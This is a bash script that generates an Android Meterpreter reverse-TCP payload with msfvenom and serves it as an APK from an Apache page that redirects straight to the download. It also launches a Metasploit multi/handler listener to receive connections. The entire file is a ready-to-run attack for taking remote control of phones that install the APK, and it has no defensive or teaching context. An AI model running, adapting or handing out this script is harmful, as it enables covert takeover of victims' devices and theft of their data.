#!/bin/bash

# Set the local IP address
LOCAL_IP=$(hostname -I | awk '{print $1}')

# Set the payload name
PAYLOAD_NAME="payload_$(date +%s).apk"

# Set the Metasploit options
LHOST=$LOCAL_IP
LPORT=11506

# Define the start_server function
start_server() {
  echo "Web server started at http://$LOCAL_IP/"
  echo "To download the payload, visit http://$LOCAL_IP/downloads/$PAYLOAD_NAME"

  # Create the payload download page
  echo "<html><head><title>...</title><meta http-equiv=\"refresh\" content=\"0; url=/downloads/$PAYLOAD_NAME\"></head><body><p>Downloading payload...</p></body></html>" | sudo tee /var/www/html/downloads/index.html

  # Start Apache web server
  sudo systemctl start apache2
}

# Generate the payload using msfvenom
echo "Generating payload..."
sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -o "/var/www/html/downloads/$PAYLOAD_NAME"

# Set the file permissions for the payload
echo "Setting file permissions..."
sudo chmod 644 "/var/www/html/downloads/$PAYLOAD_NAME"

# Start the Metasploit listener
echo "Starting Metasploit listener..."
gnome-terminal -- msfconsole -q -x "use exploit/multi/handler; set PAYLOAD android/meterpreter/reverse_tcp; set LHOST $LHOST; set LPORT $LPORT; run"

# Start the web server and print the access log to the terminal
start_server

# Stop the web server and Metasploit listener when the script is terminated
trap 'echo "Stopping web server and Metasploit listener..."; sudo systemctl stop apache2; exit' SIGINT
